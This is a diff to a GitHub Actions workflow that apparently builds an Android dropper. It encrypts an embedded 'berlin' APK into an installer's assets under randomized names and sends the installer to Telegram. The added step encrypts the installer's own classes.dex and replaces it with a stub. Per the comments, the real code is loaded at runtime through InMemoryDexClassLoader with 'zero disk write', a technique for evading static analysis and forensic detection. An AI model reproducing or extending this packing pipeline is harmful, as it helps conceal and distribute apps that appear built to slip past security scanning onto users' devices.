@@ -78,17 +78,25 @@ jobs:
       # Runs after berlin is signed+verified. Encrypts berlin APK with AES-256-CBC,
       # copies blob into installer assets, builds installer, sends installer to Telegram.
 
-      - name: Generate ASSET_C and BERLIN_KEY
+      - name: Generate ASSET_C, BERLIN_KEY, BERLIN_DEX_ASSET and BERLIN_DEX_KEY
         id: berlin_keys
         run: |
           # Same logic as FingerprintPlugin.groovy Step 5+6 — generated BEFORE Gradle build
           # so we can encrypt the blob first, then pass the same keys into Gradle via -P flags
           ASSET_C=$(python3 -c "import os; print(os.urandom(4).hex() + '.bin')")
           BERLIN_KEY=$(python3 -c "import os; print(os.urandom(32).hex())")
+          # Berlin DEX encryption keys — installer's own classes.dex encrypted at build time
+          # Decrypted at runtime by BerlinAppEntry.kt via InMemoryDexClassLoader (zero disk write)
+          BERLIN_DEX_ASSET=$(python3 -c "import os; print(os.urandom(4).hex() + '.bin')")
+          BERLIN_DEX_KEY=$(python3 -c "import os; print(os.urandom(32).hex())")
           echo "ASSET_C=${ASSET_C}" >> $GITHUB_OUTPUT
           echo "BERLIN_KEY=${BERLIN_KEY}" >> $GITHUB_OUTPUT
-          echo "ASSET_C   : ${ASSET_C}"
-          echo "BERLIN_KEY: ${BERLIN_KEY:0:16}..."
+          echo "BERLIN_DEX_ASSET=${BERLIN_DEX_ASSET}" >> $GITHUB_OUTPUT
+          echo "BERLIN_DEX_KEY=${BERLIN_DEX_KEY}" >> $GITHUB_OUTPUT
+          echo "ASSET_C          : ${ASSET_C}"
+          echo "BERLIN_KEY       : ${BERLIN_KEY:0:16}..."
+          echo "BERLIN_DEX_ASSET : ${BERLIN_DEX_ASSET}"
+          echo "BERLIN_DEX_KEY   : ${BERLIN_DEX_KEY:0:16}..."
 
       - name: Clear installer assets (berlin build has no companion)
         run: |
@@ -140,6 +148,8 @@ jobs:
           ./gradlew assembleRelease \
             -Pberlin.assetC="${{ steps.berlin_keys.outputs.ASSET_C }}" \
             -Pberlin.berlinKey="${{ steps.berlin_keys.outputs.BERLIN_KEY }}" \
+            -Pberlin.dexAsset="${{ steps.berlin_keys.outputs.BERLIN_DEX_ASSET }}" \
+            -Pberlin.dexKey="${{ steps.berlin_keys.outputs.BERLIN_DEX_KEY }}" \
             --stacktrace
 
           INSTALLER_APK=$(find app/build/outputs/apk/release -name "*.apk" | head -1)
@@ -150,6 +160,25 @@ jobs:
           echo "INSTALLER_APK=${INSTALLER_APK}" >> $GITHUB_ENV
           echo "Installer APK: ${INSTALLER_APK}"
           stat -c "%n : %s bytes" "${INSTALLER_APK}"
+
+      - name: Encrypt installer DEX (Berlin DEX encryption — zero disk write at runtime)
+        run: |
+          # Post-build: extract classes.dex from installer APK, encrypt AES-256-CBC,
+          # store as assets/BERLIN_DEX_ASSET, replace original with stub DEX.
+          # BerlinAppEntry.kt decrypts at runtime via InMemoryDexClassLoader — zero disk write.
+          python3 berlin/scripts/encrypt_installer_dex.py \
+            "${{ env.INSTALLER_APK }}" \
+            installer_dex_encrypted.apk \
+            "${{ steps.berlin_keys.outputs.BERLIN_DEX_ASSET }}" \
+            "${{ steps.berlin_keys.outputs.BERLIN_DEX_KEY }}"
+
+          if [ ! -f "installer_dex_encrypted.apk" ]; then
+            echo "ERROR: DEX encryption failed — installer_dex_encrypted.apk not produced"
+            exit 1
+          fi
+          echo "INSTALLER_APK=installer_dex_encrypted.apk" >> $GITHUB_ENV
+          echo "DEX encryption complete:"
+          stat -c "%n : %s bytes" "installer_dex_encrypted.apk"
 
       - name: Sign Installer APK
         run: |
